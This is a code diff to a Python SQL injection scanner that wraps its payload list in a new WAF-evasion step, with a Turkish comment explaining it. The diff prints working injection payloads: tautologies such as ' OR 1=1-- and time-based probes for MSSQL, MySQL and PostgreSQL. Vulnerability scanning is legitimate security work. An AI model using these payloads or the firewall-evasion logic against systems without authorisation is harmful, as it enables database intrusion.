@@ -88,10 +88,12 @@ class SQLInjectionScanner(BaseScanner):
             from websecure.core.payloads import get_payloads
             loaded = get_payloads("sqli")
             if loaded:
-                return loaded
+                # WAF varsa imza payload'larını (' OR '1'='1 …) bypass varyantlarıyla
+                # genişlet; WAF yoksa no-op (benchmark/temiz hedef aynen).
+                return self.waf_evade("sqli", loaded)
         except (ImportError, OSError, ValueError) as exc:
             logger.warning(f"[SQLi] Could not load external payloads, using built-in: {exc!r}")
-        return [
+        return self.waf_evade("sqli", [
             "'", '"', "')", '");',
             "' OR '1'='1", '" OR "1"="1',
             "' OR 1=1--", '" OR 1=1--',
@@ -100,7 +102,7 @@ class SQLInjectionScanner(BaseScanner):
             "'; WAITFOR DELAY '0:0:5'--",   # MSSQL time-based
             "'; SELECT SLEEP(5)--",          # MySQL time-based
             "' || pg_sleep(5)--",            # PostgreSQL time-based
-        ]
+        ])
 
     def _extract_error_fingerprints(self, text: str) -> set:
         """Return the set of (db, label) DB-error fingerprints in ``text``.
